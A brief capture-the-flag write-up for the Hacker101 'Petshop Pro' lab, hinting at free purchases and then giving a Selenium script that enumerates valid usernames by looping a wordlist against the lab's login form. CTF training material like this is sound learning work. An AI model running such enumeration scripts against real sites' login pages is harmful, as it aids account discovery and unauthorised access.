# Petshop Pro - capture the flag from hacker101

At the start you are given simple website with cats and dogs which you can simply add to your cart. After adding few cats and dogs you can proceed to checkout and after submitting the orders you got server is unavailable.

Isn't beautiful to buy something for free. Well, thats what is the first flag about.

* First hint is: ...

```python
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

driver = webdriver.Firefox()
driver.get("http://35.190.155.168/e3c7a89d01/login")

# Opening file
file1 = open('user_list.txt', 'r')
 
for line in file1:
    user_name = line.strip()
    user = driver.find_elements_by_css_selector('body > form > p:nth-child(1) > input[type=text]')[0]
    user.send_keys(user_name)

    loginbtn = driver.find_elements_by_xpath('/html/body/form/p[3]/input')[0]
    loginbtn.send_keys(Keys.RETURN)

    driver.implicitly_wait(15)

    resp = driver.find_elements_by_css_selector('body > p:nth-child(2) > b:nth-child(1)')[0]
    if resp.text != 'Invalid username':
        print(user_name)
        break

    time.sleep(1)
 
# Closing files
file1.close()
driver.close()
```